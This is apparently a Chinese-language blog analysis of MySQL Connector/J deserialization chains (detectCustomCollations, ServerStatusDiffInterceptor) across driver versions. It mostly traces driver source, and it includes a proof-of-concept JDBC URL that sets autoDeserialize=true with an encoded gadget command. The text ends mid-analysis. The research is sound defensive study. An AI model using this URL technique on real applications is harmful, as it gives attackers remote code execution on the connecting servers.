<h3 id="扩展参数带来的安全问题"><a href="#扩展参数带来的安全问题" class="headerlink" title="扩展参数带来的安全问题"></a>扩展参数带来的安全问题</h3><p>mysql JDBC 中包含⼀个危险的扩展参数： autoDeserialize。这个参数配置为true时，JDBC客户端将会⾃动反序列化服务端返回的BLOB类型字段</p>
<h2 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h2><p>环境：mysql-connector-java-5.1.28</p>
<p>环境：mysql-connector-java-5.1.28 为了复现漏洞，这⾥选了合适的版本，上⾯调试部分是我⾃⼰通过调试获取连接的过程发现URL还存在有扩展参数的过程。⼤体逻辑 差不多，⼀些细节存在差异所以导致漏洞</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    com.mysql.jdbc.<span class="type">Connection</span> <span class="variable">newConn</span> <span class="operator">=</span> ConnectionImpl.getInstance(<span class="built_in">this</span>.host(props), <span class="built_in">this</span>.port(props), props, <span class="built_in">this</span>.database(props), url);</span><br><span class="line">    <span class="keyword">return</span> newConn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同上⾯⾼版本⼀样，这⾥⼀样会实例化ConnetionImpl对象 最终会进⼊Util.handleNewInstance⽅法，这⾥会实例化JDBC4Connetion对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JDBC4Connection</span><span class="params">(String hostToConnectTo, <span class="type">int</span> portToConnectTo, Properties info, String databaseToConnectTo, String url)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进⽗类构造⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConnectionPropertiesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.allowLoadLocalInfile = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowLoadLocalInfile&quot;</span>, <span class="literal">true</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.loadDataLocal&quot;</span>), <span class="string">&quot;3.0.3&quot;</span>, SECURITY_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.allowMultiQueries = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowMultiQueries&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowMultiQueries&quot;</span>), <span class="string">&quot;3.1.1&quot;</span>, SECURITY_CATEGORY, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">this</span>.allowNanAndInf = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowNanAndInf&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowNANandINF&quot;</span>), <span class="string">&quot;3.1.5&quot;</span>, MISC_CATEGORY, Integer.MIN_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.allowUrlInLocalInfile = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowUrlInLocalInfile&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowUrlInLoadLocal&quot;</span>), <span class="string">&quot;3.1.4&quot;</span>, SECURITY_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.alwaysSendSetIsolation = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;alwaysSendSetIsolation&quot;</span>, <span class="literal">true</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.alwaysSendSetIsolation&quot;</span>), <span class="string">&quot;3.1.7&quot;</span>, PERFORMANCE_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.autoClosePStmtStreams = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;autoClosePStmtStreams&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.autoClosePstmtStreams&quot;</span>), <span class="string">&quot;3.1.12&quot;</span>, MISC_CATEGORY, Integer.MIN_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.allowMasterDownConnections = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowMasterDownConnections&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowMasterDownConnections&quot;</span>), <span class="string">&quot;5.1.27&quot;</span>, HA_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.autoDeserialize = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;autoDeserialize&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.autoDeserialize&quot;</span>), <span class="string">&quot;3.1.5&quot;</span>, MISC_CATEGORY, Integer.MIN_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.autoGenerateTestcaseScript = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;autoGenerateTestcaseScript&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.autoGenerateTestcaseScript&quot;</span>), <span class="string">&quot;3.1.9&quot;</span>, DEBUGING_PROFILING_CATEGORY, Integer.MIN_VALUE);</span><br></pre></td></tr></table></figure>

<p>这⾥是扩展参数的初始化 ConnetionImpl对象构造⽅法在做完⼀些初始化后，会调⽤⼀些⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.dbmd = <span class="built_in">this</span>.getMetaData(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">this</span>.initializeSafeStatementInterceptors();</span><br><span class="line">    <span class="built_in">this</span>.createNewIO(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">this</span>.unSafeStatementInterceptors();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到createNewIO⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createNewIO</span><span class="params">(<span class="type">boolean</span> isForReconnect)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.getConnectionMutex()) &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">mergedProps</span> <span class="operator">=</span> <span class="built_in">this</span>.exposeAsProperties(<span class="built_in">this</span>.props);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.getHighAvailability()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.connectOneTryOnly(isForReconnect, mergedProps);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.connectWithRetries(isForReconnect, mergedProps);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这⾥会调⽤connectOneTryOnly⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.coreConnect(mergedProps);</span><br><span class="line">    <span class="built_in">this</span>.connectionId = <span class="built_in">this</span>.io.getThreadId();</span><br><span class="line">    <span class="built_in">this</span>.isClosed = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldAutoCommit</span> <span class="operator">=</span> <span class="built_in">this</span>.getAutoCommit();</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldIsolationLevel</span> <span class="operator">=</span> <span class="built_in">this</span>.isolationLevel;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldReadOnly</span> <span class="operator">=</span> <span class="built_in">this</span>.isReadOnly(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">oldCatalog</span> <span class="operator">=</span> <span class="built_in">this</span>.getCatalog();</span><br><span class="line">    <span class="built_in">this</span>.io.setStatementInterceptors(<span class="built_in">this</span>.statementInterceptors);</span><br><span class="line">    <span class="built_in">this</span>.initializePropsFromServer();</span><br></pre></td></tr></table></figure>

<p>coreConnect⽅法主要⽤于建⽴连接，完了以后会调⽤initializePropsFromServer⽅法，initializePropsFromServer⽅法内⼜会调⽤ buildCollationMapping⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">        HashMap&lt;Integer, String&gt; javaCharset = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            javaCharset = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">                        results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">                            Util.resultSetToMap(sortedCollationMap, results, <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                         </span><br></pre></td></tr></table></figure>

<p>stmt变量通过getMetadataSafeStatement⽅法获得当前环境的StatementImpl对象，然后通过executeQuery⽅法执⾏SQL语句 然后执⾏Util.resultSetToMap⽅法，versionMeetsMinimum⽅法是判断驱动程序版本的</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">resultSetToMap</span>(Map mappedValues, ResultSet rs, <span class="type">int</span> <span class="built_in">key</span>, <span class="type">int</span> value) <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">while</span>(rs.<span class="property">next</span>()) &#123;</span><br><span class="line">        mappedValues.<span class="property">put</span>(rs.<span class="property">getObject</span>(<span class="built_in">key</span>), rs.<span class="property">getObject</span>(value));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会将SHOW COLLATION查询结果的第三列和第⼆列的值存放进mappedValues 还会调⽤ResultSetImpl对象的getObject⽅法，对应反序列化位置，需要字段类型为blob</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">    <span class="keyword">if</span> (field.getMysqlType() == <span class="number">255</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.connection.getAutoDeserialize()) &#123;</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> data;</span><br><span class="line">            <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (data[<span class="number">0</span>] != -<span class="number">84</span> || data[<span class="number">1</span>] != -<span class="number">19</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.getString(columnIndex);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">                    <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">                    obj = objIn.readObject();</span><br><span class="line">                    objIn.close();</span><br><span class="line">                    bytesIn.close();</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>当攻击者能控制URL指向恶意mysql服务端时，控制扩展参数autoDeserialize为true，且SHOW COLLATION的返回结果需要有三个字 段，且需要字段2或3为BLOB装载我们的序列化数据，那么在返回数据时会触发反序列化造成攻击 那么怎么实现SHOW COLLATION这个SQL语句，能返回我们想要的数据呢？ 这⾥可以⽤cobar项⽬，它是分⽚数据库代理。也可以使⽤4ra1n师傅做的mysql-fake-server项⽬</p>
<p>设置好选项后，app会⽣成好poc，向这个poc发起数据库连接即可</p>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jdbc;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcConnect</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">	<span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:49240/test?autoDeserialize=true&amp;user=base64ZGVzZXJfQ0M0NF9vcGVuIC1hIENhbGN1bGF0b3I=&quot;</span>;</span><br><span class="line">	Class.forName(CLASS_NAME);</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line">	connection.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**mysql-connector-java-5.1.29——5.1.40 **</p>
<p>环境：mysql-connector-java-5.1.29</p>
<p>简单看看改进的部分，位于com.mysql.jdbc.ConnectionImpl#buildCollationMapping⽅法</p>
<p>不仅需要驱动类版本⼤于4.1.0，还添加了新的要求</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>) &amp;&amp; <span class="built_in">this</span>.getDetectCustomCollations())</span><br></pre></td></tr></table></figure>

<p>getDetectCustomCollations⽅法返回扩展参数detectCustomCollations的值，若没设置，默认为false </p>
<p>只需要新添加扩展参数 detectCustomCollations&#x3D;true 即可，这样才有机会进⼊Util.resultSetToMap⽅法</p>
<p><strong>mysql-connector-java-5.1.41——5.1.48</strong></p>
<p> 环境：mysql-connector-java-5.1.41 </p>
<p>继续看看改进的部分，定位到 com.mysql.jdbc.ConnectionImpl#buildCollationMapping⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (customCharset == <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.getDetectCustomCollations() &amp;&amp; <span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>新加customCharset变量需要为null，默认为null，不管</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">collationIndex</span> <span class="operator">=</span> ((Number)results.getObject(<span class="number">3</span>)).intValue();</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> results.getString(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (collationIndex &gt;= <span class="number">2048</span> || !charsetName.equals(CharsetMapping.getMysqlCharsetNameForCollationIndex(collationIndex))) &#123;</span><br><span class="line">            ((Map)customCharset).put(collationIndex, charsetName);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这⾥没有调⽤Util.resultSetToMap⽅法，⽽是改⽤直接调⽤results.getObject(3)，还是会调⽤getObject⽅法，不影响利⽤ 但从mysql-connector-java-5.1.49以后，就不在调⽤results.getObject⽅法，此调⽤链失效</p>
<p>**mysql-connector-java-6.0.2——6.0.6 **</p>
<p>环境：mysql-connector-java-6.0.6 </p>
<p>该版本改⽤com.mysql.cj.jdbc.Driver作为驱动类，所以这⾥定位到com.mysql.jc.jdbc.ConnectionImpl#buildCollationMapping⽅法</p>
<p>发现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((Boolean)<span class="built_in">this</span>.getPropertySet().getBooleanReadableProperty(<span class="string">&quot;detectCustomCollations&quot;</span>).getValue()) &#123;</span><br></pre></td></tr></table></figure>

<p>还是需要扩展参数detectCustomCollations为true</p>
<p>调⽤ResultSetUtil.resultSetToMap⽅法，⽅法内同样调⽤getObject⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line">ResultSetUtil.resultSetToMap(sortedCollationMap, results, <span class="number">3</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>新的ResultSet对象，com.mysql.cj.jdbc.result.ResultSetImpl对象不影响利⽤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BIT:</span><br><span class="line">                      <span class="keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;</span><br><span class="line">                          <span class="keyword">return</span> field.isSingleBit() ? <span class="built_in">this</span>.getBoolean(columnIndex) : <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                          <span class="type">byte</span>[] data = <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">                          <span class="keyword">if</span> (!(Boolean)<span class="built_in">this</span>.connection.getPropertySet().getBooleanReadableProperty(<span class="string">&quot;autoDeserialize&quot;</span>).getValue()) &#123;</span><br><span class="line">                              <span class="keyword">return</span> data;</span><br><span class="line">                          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                              <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> data;</span><br><span class="line">                              <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                                  <span class="keyword">if</span> (data[<span class="number">0</span>] != -<span class="number">84</span> || data[<span class="number">1</span>] != -<span class="number">19</span>) &#123;</span><br><span class="line">                                      <span class="keyword">return</span> <span class="built_in">this</span>.getString(columnIndex);</span><br><span class="line">                                  &#125;</span><br><span class="line"></span><br><span class="line">                                  <span class="keyword">try</span> &#123;</span><br><span class="line">                                      <span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">                                      <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">                                      obj = objIn.readObject();</span><br><span class="line">                                      objIn.close();</span><br><span class="line">                                      bytesIn.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h2><p>**mysql-connector-java-5.1.0——5.1.10 **</p>
<p>环境：mysql-connector-java-5.1.10 </p>
<p>在较低的mysql-connector-java版本下是不能利detectCustomCollations链的，原因是ConnectionImpl#buildCollationMapping⽅法下并没有执⾏到ResultSet对象的getObject⽅法 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sortedCollationMap == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">    sortedCollationMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line"></span><br><span class="line">    stmt = <span class="built_in">this</span>.getMetadataSafeStatement();</span><br><span class="line"></span><br><span class="line">    results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> results.getString(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">charsetIndex</span> <span class="operator">=</span> Constants.integerValueOf(results.getInt(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">        sortedCollationMap.put(charsetIndex, charsetName);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那有没有其它的调⽤链能利⽤呢？</p>
<p> 利⽤条件：需要连接后执⾏查询</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select 10086&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>执⾏完查询后，重点在获取结果位置，跟进executeQuery⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (locallyScopedConn.useMaxRows()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.hasLimitClause) &#123;</span><br><span class="line">        <span class="built_in">this</span>.results = <span class="built_in">this</span>.executeInternal(<span class="built_in">this</span>.maxRows, sendPacket, <span class="built_in">this</span>.createStreamingResultSet(), <span class="literal">true</span>, metadataFromCache, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.maxRows &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.executeSimpleNonQuery(locallyScopedConn, <span class="string">&quot;SET OPTION SQL_SELECT_LIMIT=DEFAULT&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.executeSimpleNonQuery(locallyScopedConn, <span class="string">&quot;SET OPTION SQL_SELECT_LIMIT=&quot;</span> + <span class="built_in">this</span>.maxRows);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.results = <span class="built_in">this</span>.executeInternal(-<span class="number">1</span>, sendPacket, doStreaming, <span class="literal">true</span>, metadataFromCache, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (oldCatalog != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.connection.setCatalog(oldCatalog);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.results = <span class="built_in">this</span>.executeInternal(-<span class="number">1</span>, sendPacket, doStreaming, <span class="literal">true</span>, metadataFromCache, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>locallyScopedConn.useMaxRows⽅法默认返回false，会调⽤executeInternal⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs = locallyScopedConnection.execSQL(<span class="built_in">this</span>, (String)<span class="literal">null</span>, maxRowsToRetrieve, sendPacket, <span class="built_in">this</span>.resultSetType, <span class="built_in">this</span>.resultSetConcurrency, createStreamingResultSet, <span class="built_in">this</span>.currentCatalog, metadataFromCache, isBatch);</span><br></pre></td></tr></table></figure>

<p>当⽤当前连接对象的execSQL⽅法，也就是ConnetionImpl#execSQL</p>
